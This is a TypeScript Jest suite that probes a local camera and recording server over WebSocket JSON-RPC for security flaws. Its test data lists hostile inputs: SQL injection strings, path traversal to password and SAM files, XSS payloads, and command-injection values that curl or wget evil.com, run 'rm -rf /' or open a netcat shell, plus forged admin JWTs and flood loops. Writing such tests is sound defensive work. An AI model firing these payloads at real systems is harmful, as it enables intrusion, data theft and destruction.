/**
 * Security Attack Vector Testing Suite
 * 
 * Comprehensive security testing including:
 * - Authentication bypass attempts
 * - Authorization escalation
 * - Input validation attacks
 * - Protocol manipulation
 * - Resource exhaustion attacks
 * - Information disclosure tests
 */

import { WebSocketService } from '../../src/services/websocket/WebSocketService';
import { AuthService } from '../../src/services/auth/AuthService';
import { DeviceService } from '../../src/services/device/DeviceService';
import { FileService } from '../../src/services/file/FileService';
import { RecordingService } from '../../src/services/recording/RecordingService';
import { LoggerService } from '../../src/services/logger/LoggerService';

interface SecurityTestResult {
  attack: string;
  vector: string;
  success: boolean;
  response: any;
  error?: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  recommendation?: string;
}

class SecurityTester {
  private webSocketService: WebSocketService;
  private authService: AuthService;
  private deviceService: DeviceService;
  private fileService: FileService;
  private recordingService: RecordingService;
  private loggerService: LoggerService;
  private results: SecurityTestResult[] = [];

  constructor() {
    this.loggerService = new LoggerService();
    this.webSocketService = new WebSocketService({ url: 'ws://localhost:8002/ws' });
    this.authService = new AuthService(this.webSocketService, this.loggerService);
    this.deviceService = new DeviceService(this.webSocketService, this.loggerService);
    this.fileService = new FileService(this.webSocketService, this.loggerService);
    this.recordingService = new RecordingService(this.webSocketService, this.loggerService);
  }

  async connect(): Promise<void> {
    await this.webSocketService.connect();
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  async disconnect(): Promise<void> {
    if (this.webSocketService) {
      await this.webSocketService.disconnect();
    }
  }

  async testAttack(attack: string, vector: string, testFn: () => Promise<any>, severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'): Promise<SecurityTestResult> {
    const result: SecurityTestResult = {
      attack,
      vector,
      success: false,
      response: null,
      severity
    };

    try {
      const response = await testFn();
      result.success = true;
      result.response = response;
      
      // Determine if this is a security issue
      if (this.isSecurityVulnerability(response, attack)) {
        result.severity = 'HIGH';
        result.recommendation = this.getRecommendation(attack);
      }
      
      console.log(`🔍 ${attack}: ${vector} - ${result.success ? 'SUCCESS' : 'FAILED'} (${severity})`);
    } catch (error: any) {
      result.success = false;
      result.error = error.message;
      
      // Some errors might indicate security issues
      if (this.isSecurityError(error, attack)) {
        result.severity = 'MEDIUM';
        result.recommendation = 'Review error handling for information disclosure';
      }
      
      console.log(`🔍 ${attack}: ${vector} - FAILED (${severity}) - ${error.message}`);
    }

    this.results.push(result);
    return result;
  }

  private isSecurityVulnerability(response: any, attack: string): boolean {
    // Check if response indicates a security vulnerability
    switch (attack) {
      case 'SQL Injection':
        return response && (response.includes('database') || response.includes('SQL') || response.includes('table'));
      case 'Path Traversal':
        return response && (response.includes('file://') || response.includes('/etc/') || response.includes('/windows/'));
      case 'XSS':
        return response && (response.includes('<script>') || response.includes('javascript:'));
      case 'Authentication Bypass':
        return response && response.authenticated === true;
      case 'Authorization Escalation':
        return response && (response.role === 'admin' || response.permissions?.includes('admin'));
      default:
        return false;
    }
  }

  private isSecurityError(error: any, attack: string): boolean {
    // Check if error message reveals sensitive information
    const sensitivePatterns = [
      'database', 'SQL', 'table', 'column',
      '/etc/', '/windows/', 'file://',
      'password', 'secret', 'key',
      'stack trace', 'exception'
    ];

    const errorMessage = error.message?.toLowerCase() || '';
    return sensitivePatterns.some(pattern => errorMessage.includes(pattern));
  }

  private getRecommendation(attack: string): string {
    switch (attack) {
      case 'SQL Injection':
        return 'Implement parameterized queries and input validation';
      case 'Path Traversal':
        return 'Validate and sanitize file paths, use whitelist approach';
      case 'XSS':
        return 'Implement output encoding and CSP headers';
      case 'Authentication Bypass':
        return 'Strengthen authentication mechanisms';
      case 'Authorization Escalation':
        return 'Implement proper role-based access control';
      default:
        return 'Review and strengthen security controls';
    }
  }

  getResults(): SecurityTestResult[] {
    return [...this.results];
  }

  getSecuritySummary(): { total: number; vulnerabilities: number; bySeverity: Record<string, number> } {
    const vulnerabilities = this.results.filter(r => r.severity === 'HIGH' || r.severity === 'CRITICAL');
    const bySeverity = this.results.reduce((acc, r) => {
      acc[r.severity] = (acc[r.severity] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    return {
      total: this.results.length,
      vulnerabilities: vulnerabilities.length,
      bySeverity
    };
  }

  reset(): void {
    this.results = [];
  }
}

describe('Security Attack Vector Testing', () => {
  let securityTester: SecurityTester;

  beforeAll(async () => {
    securityTester = new SecurityTester();
    await securityTester.connect();
  });

  afterAll(async () => {
    await securityTester.disconnect();
    await new Promise(resolve => setTimeout(resolve, 100));
  });

  beforeEach(() => {
    securityTester.reset();
  });

  describe('REQ-SEC-001: Authentication Attacks', () => {
    test('should test authentication bypass attempts', async () => {
      const bypassAttempts = [
        { vector: 'Empty token', payload: { auth_token: '' } },
        { vector: 'Null token', payload: { auth_token: null } },
        { vector: 'Undefined token', payload: { auth_token: undefined } },
        { vector: 'Invalid token format', payload: { auth_token: 'invalid' } },
        { vector: 'Malformed JWT', payload: { auth_token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid' } },
        { vector: 'Expired token', payload: { auth_token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiaWF0IjoxNjAwMDAwMDAwLCJleHAiOjE2MDAwMDAwMDB9.invalid' } },
        { vector: 'No token field', payload: {} },
        { vector: 'Wrong field name', payload: { token: 'test' } },
      ];

      for (const attempt of bypassAttempts) {
        await securityTester.testAttack(
          'Authentication Bypass',
          attempt.vector,
          async () => {
            return await securityTester.webSocketService.sendRPC('authenticate', attempt.payload);
          },
          'HIGH'
        );
      }
    });

    test('should test authorization escalation attempts', async () => {
      const escalationAttempts = [
        { vector: 'Role manipulation in token', payload: { auth_token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.invalid' } },
        { vector: 'Permission escalation', payload: { auth_token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwicGVybWlzc2lvbnMiOlsidmlldyIsImNvbnRyb2wiLCJhZG1pbiJdLCJpYXQiOjE2MDAwMDAwMDAsImV4cCI6OTk5OTk5OTk5OX0.invalid' } },
        { vector: 'Admin role claim', payload: { auth_token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.invalid' } },
      ];

      for (const attempt of escalationAttempts) {
        await securityTester.testAttack(
          'Authorization Escalation',
          attempt.vector,
          async () => {
            return await securityTester.webSocketService.sendRPC('authenticate', attempt.payload);
          },
          'CRITICAL'
        );
      }
    });
  });

  describe('REQ-SEC-002: Input Validation Attacks', () => {
    test('should test SQL injection attempts', async () => {
      const sqlInjections = [
        "'; DROP TABLE cameras; --",
        "1' OR '1'='1",
        "admin'--",
        "'; DELETE FROM recordings; --",
        "' UNION SELECT * FROM users--",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 1=1--",
        "'; UPDATE users SET role='admin' WHERE username='test'; --"
      ];

      for (const injection of sqlInjections) {
        await securityTester.testAttack(
          'SQL Injection',
          injection,
          async () => {
            return await securityTester.deviceService.getCameraStatus(injection);
          },
          'CRITICAL'
        );
      }
    });

    test('should test path traversal attempts', async () => {
      const pathTraversals = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "../../../../etc/shadow",
        "....//....//....//etc//passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM"
      ];

      for (const traversal of pathTraversals) {
        await securityTester.testAttack(
          'Path Traversal',
          traversal,
          async () => {
            return await securityTester.fileService.getRecordingInfo(traversal);
          },
          'HIGH'
        );
      }
    });

    test('should test XSS attempts', async () => {
      const xssPayloads = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "';alert('xss');//",
        "<svg onload=alert('xss')>",
        "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "<body onload=alert('xss')>"
      ];

      for (const xss of xssPayloads) {
        await securityTester.testAttack(
          'XSS',
          xss,
          async () => {
            return await securityTester.deviceService.takeSnapshot('camera0', xss);
          },
          'HIGH'
        );
      }
    });

    test('should test command injection attempts', async () => {
      const commandInjections = [
        "test; ls -la",
        "test && cat /etc/passwd",
        "test | whoami",
        "test; rm -rf /",
        "test && curl http://evil.com/steal",
        "test; wget http://evil.com/malware",
        "test && python -c 'import os; os.system(\"id\")'",
        "test; nc -l 4444 -e /bin/bash"
      ];

      for (const injection of commandInjections) {
        await securityTester.testAttack(
          'Command Injection',
          injection,
          async () => {
            return await securityTester.deviceService.takeSnapshot(injection, 'test.jpg');
          },
          'CRITICAL'
        );
      }
    });
  });

  describe('REQ-SEC-003: Protocol Manipulation', () => {
    test('should test malformed JSON-RPC requests', async () => {
      const malformedRequests = [
        { jsonrpc: "1.0", method: "ping" }, // Wrong version
        { jsonrpc: "2.0", method: "ping", id: null }, // Invalid ID
        { jsonrpc: "2.0", method: "ping", params: "invalid" }, // Invalid params
        { jsonrpc: "2.0", method: "", id: 1 }, // Empty method
        { jsonrpc: "2.0", id: 1 }, // Missing method
        { method: "ping" }, // Missing jsonrpc
        { jsonrpc: "2.0", method: "ping", extra: "field" }, // Extra fields
        { jsonrpc: "2.0", method: "ping", id: [] }, // Invalid ID type
      ];

      for (const request of malformedRequests) {
        await securityTester.testAttack(
          'Protocol Manipulation',
          `Malformed JSON-RPC: ${JSON.stringify(request).substring(0, 50)}`,
          async () => {
            return await securityTester.webSocketService.sendRPC(request.method || 'ping', request.params);
          },
          'MEDIUM'
        );
      }
    });

    test('should test method enumeration', async () => {
      const suspiciousMethods = [
        'admin',
        'debug',
        'config',
        'system',
        'shell',
        'exec',
        'eval',
        'load',
        'import',
        'require',
        'file',
        'read',
        'write',
        'delete',
        'remove',
        'create',
        'update',
        'backup',
        'restore',
        'shutdown',
        'restart',
        'stop',
        'start'
      ];

      for (const method of suspiciousMethods) {
        await securityTester.testAttack(
          'Method Enumeration',
          method,
          async () => {
            return await securityTester.webSocketService.sendRPC(method as any, {});
          },
          'LOW'
        );
      }
    });
  });

  describe('REQ-SEC-004: Resource Exhaustion Attacks', () => {
    test('should test buffer overflow attempts', async () => {
      const bufferOverflows = [
        'A'.repeat(10000),
        'B'.repeat(100000),
        'C'.repeat(1000000),
        'D'.repeat(10000000)
      ];

      for (const overflow of bufferOverflows) {
        await securityTester.testAttack(
          'Buffer Overflow',
          `${overflow.length} characters`,
          async () => {
            return await securityTester.deviceService.takeSnapshot(overflow, 'test.jpg');
          },
          'HIGH'
        );
      }
    });

    test('should test memory exhaustion', async () => {
      // Send many large requests rapidly
      const requests = [];
      for (let i = 0; i < 100; i++) {
        requests.push(
          securityTester.testAttack(
            'Memory Exhaustion',
            `Large request ${i}`,
            async () => {
              return await securityTester.deviceService.takeSnapshot('camera0', 'A'.repeat(1000) + i + '.jpg');
            },
            'MEDIUM'
          )
        );
      }

      await Promise.allSettled(requests);
    });

    test('should test connection exhaustion', async () => {
      // Attempt to create many connections
      const connections = [];
      for (let i = 0; i < 50; i++) {
        connections.push(
          securityTester.testAttack(
            'Connection Exhaustion',
            `Connection ${i}`,
            async () => {
              const ws = new WebSocketService({ url: 'ws://localhost:8002/ws' });
              await ws.connect();
              const result = await ws.sendRPC('ping', {});
              await ws.disconnect();
              return result;
            },
            'MEDIUM'
          )
        );
      }

      await Promise.allSettled(connections);
    });
  });

  describe('REQ-SEC-005: Information Disclosure', () => {
    test('should test error message information disclosure', async () => {
      const errorTriggers = [
        { method: 'nonexistent_method', params: {} },
        { method: 'get_camera_list', params: { invalid: 'param' } },
        { method: 'take_snapshot', params: {} }, // Missing required params
        { method: 'start_recording', params: { device: null } },
      ];

      for (const trigger of errorTriggers) {
        await securityTester.testAttack(
          'Information Disclosure',
          `Error trigger: ${trigger.method}`,
          async () => {
            return await securityTester.webSocketService.sendRPC(trigger.method as any, trigger.params);
          },
          'MEDIUM'
        );
      }
    });

    test('should test timing attacks', async () => {
      const timingTests = [
        { vector: 'Valid method', method: 'ping' },
        { vector: 'Invalid method', method: 'nonexistent_method' },
        { vector: 'Valid auth attempt', method: 'authenticate', params: { auth_token: 'valid_token' } },
        { vector: 'Invalid auth attempt', method: 'authenticate', params: { auth_token: 'invalid_token' } },
      ];

      for (const test of timingTests) {
        const startTime = Date.now();
        
        await securityTester.testAttack(
          'Timing Attack',
          test.vector,
          async () => {
            const result = await securityTester.webSocketService.sendRPC(test.method as any, test.params || {});
            const responseTime = Date.now() - startTime;
            return { result, responseTime };
          },
          'LOW'
        );
      }
    });
  });

  describe('REQ-SEC-006: Business Logic Attacks', () => {
    test('should test privilege escalation through business logic', async () => {
      const privilegeTests = [
        { vector: 'Access admin methods without auth', method: 'get_metrics' },
        { vector: 'Access operator methods without auth', method: 'take_snapshot', params: { device: 'camera0' } },
        { vector: 'Access viewer methods without auth', method: 'get_camera_list' },
        { vector: 'Delete files without permission', method: 'delete_recording', params: { filename: 'test.mp4' } },
        { vector: 'Access system info without permission', method: 'get_server_info' },
      ];

      for (const test of privilegeTests) {
        await securityTester.testAttack(
          'Privilege Escalation',
          test.vector,
          async () => {
            return await securityTester.webSocketService.sendRPC(test.method as any, test.params || {});
          },
          'HIGH'
        );
      }
    });

    test('should test data manipulation attacks', async () => {
      const dataManipulationTests = [
        { vector: 'Modify camera settings', method: 'set_camera_config', params: { device: 'camera0', config: { resolution: '9999x9999' } } },
        { vector: 'Change recording settings', method: 'set_recording_config', params: { format: 'malicious' } },
        { vector: 'Modify system config', method: 'set_system_config', params: { security: false } },
      ];

      for (const test of dataManipulationTests) {
        await securityTester.testAttack(
          'Data Manipulation',
          test.vector,
          async () => {
            return await securityTester.webSocketService.sendRPC(test.method as any, test.params);
          },
          'MEDIUM'
        );
      }
    });
  });

  afterAll(() => {
    const results = securityTester.getResults();
    const summary = securityTester.getSecuritySummary();
    
    console.log('\n=== Security Test Summary ===');
    console.log(`Total Attacks: ${summary.total}`);
    console.log(`Vulnerabilities Found: ${summary.vulnerabilities}`);
    console.log(`Severity Breakdown:`, summary.bySeverity);
    
    // Log high-severity findings
    const highSeverity = results.filter(r => r.severity === 'HIGH' || r.severity === 'CRITICAL');
    if (highSeverity.length > 0) {
      console.log('\n=== High Severity Findings ===');
      highSeverity.forEach(result => {
        console.log(`${result.attack} (${result.severity}): ${result.vector}`);
        if (result.recommendation) {
          console.log(`  Recommendation: ${result.recommendation}`);
        }
      });
    }

    // Security assessment
    if (summary.vulnerabilities === 0) {
      console.log('\n✅ SECURITY ASSESSMENT: No critical vulnerabilities found');
    } else if (summary.vulnerabilities <= 2) {
      console.log('\n⚠️  SECURITY ASSESSMENT: Low risk - minor issues found');
    } else {
      console.log('\n❌ SECURITY ASSESSMENT: High risk - multiple vulnerabilities found');
    }
  });
});
